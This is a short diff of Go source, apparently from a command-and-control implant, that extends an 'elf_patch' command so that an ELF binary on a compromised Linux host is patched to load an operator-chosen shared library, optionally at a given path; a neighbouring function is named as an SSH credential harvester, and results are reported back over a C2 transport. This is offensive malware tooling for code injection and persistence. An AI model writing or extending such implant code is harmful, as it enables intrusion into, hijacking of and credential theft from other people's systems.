@@ -127,10 +127,11 @@ func runSSHHarvesterLinux(cmd *cobra.Command, args []string) {
 	}
 }
 
-// runElfPatchLinux implements: !elf_patch --elf_path <path> --so_path <so_path>
+// runElfPatchLinux implements: !elf_patch --elf_path <path> --so_path <so_path> [--target_path <target_path>]
 func runElfPatchLinux(cmd *cobra.Command, args []string) {
 	elfPath, _ := cmd.Flags().GetString("elf_path")
 	soPath, _ := cmd.Flags().GetString("so_path")
+	targetPath, _ := cmd.Flags().GetString("target_path")
 
 	if elfPath == "" {
 		c2transport.C2RespPrintf(cmd, "Error: elf_path is required")
@@ -142,11 +143,15 @@ func runElfPatchLinux(cmd *cobra.Command, args []string) {
 		return
 	}
 
-	err := modules.ElfPatcher(elfPath, soPath)
+	err := modules.ElfPatcher(elfPath, soPath, targetPath)
 	if err != nil {
 		c2transport.C2RespPrintf(cmd, "Error: %v", err)
 		return
 	}
 
-	c2transport.C2RespPrintf(cmd, "Successfully patched %s to load %s", elfPath, soPath)
+	if targetPath != "" {
+		c2transport.C2RespPrintf(cmd, "Successfully patched %s to load %s", elfPath, targetPath)
+	} else {
+		c2transport.C2RespPrintf(cmd, "Successfully patched %s to load library at random location", elfPath)
+	}
 }
